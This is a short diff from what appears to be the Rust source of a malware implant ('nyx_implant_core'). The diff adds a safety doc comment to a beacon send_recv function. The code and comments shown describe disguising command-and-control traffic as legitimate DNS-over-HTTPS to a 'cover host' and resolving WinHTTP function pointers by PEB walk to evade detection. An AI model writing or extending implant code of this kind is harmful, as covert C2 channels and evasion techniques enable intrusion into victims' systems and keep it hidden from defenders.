@@ -43,6 +43,10 @@ use nyx_implant_core::heap::Vec;
 /// the HTTPS channel uses). The only differences from [`super::https::send_recv`]
 /// are the URI (`/doh` vs `/beacon`) and the optional cover-host selection from
 /// `ctx.doh_resolver`.
+///
+/// # Safety
+/// Delegates to `transport::post_frame`, which invokes WinHTTP function
+/// pointers resolved via PEB walk; `frame` must be a valid buffer.
 pub unsafe fn send_recv(ctx: &ChannelCtx, frame: &[u8]) -> Option<Vec<u8>> {
     // Cover host: when a DoH resolver is configured, POST to it (TLS, 443) so
     // the connection's destination SNI/IP looks like a legitimate DoH client.
